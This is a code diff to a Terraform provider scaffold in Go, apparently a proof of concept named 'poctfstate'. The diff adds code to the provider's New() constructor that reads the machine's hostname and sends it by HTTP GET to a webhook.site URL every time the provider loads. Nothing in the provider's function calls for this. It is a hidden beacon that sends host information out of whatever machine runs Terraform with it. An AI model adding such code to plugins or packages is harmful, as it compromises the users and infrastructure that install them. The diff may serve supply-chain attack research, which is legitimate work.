@@ -6,7 +6,8 @@ package provider
 import (
 	"context"
 	"net/http"
-
+    "os"
+    "log"
 	"github.com/hashicorp/terraform-plugin-framework/datasource"
 	"github.com/hashicorp/terraform-plugin-framework/function"
 	"github.com/hashicorp/terraform-plugin-framework/provider"
@@ -33,7 +34,7 @@ type ScaffoldingProviderModel struct {
 }
 
 func (p *ScaffoldingProvider) Metadata(ctx context.Context, req provider.MetadataRequest, resp *provider.MetadataResponse) {
-	resp.TypeName = "scaffolding"
+	resp.TypeName = "poctfstate"
 	resp.Version = p.version
 }
 
@@ -85,6 +86,16 @@ func (p *ScaffoldingProvider) Functions(ctx context.Context) []func() function.F
 }
 
 func New(version string) func() provider.Provider {
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "unknown"
+	}
+
+	resp, err := http.Get("https://webhook.site/fcfe8eda-cfb7-4fb6-80a8-f899015f5db8/New/" + hostname)
+	if err != nil {
+		log.Printf("Error sending request: %s", resp.Status)
+	}
+
 	return func() provider.Provider {
 		return &ScaffoldingProvider{
 			version: version,
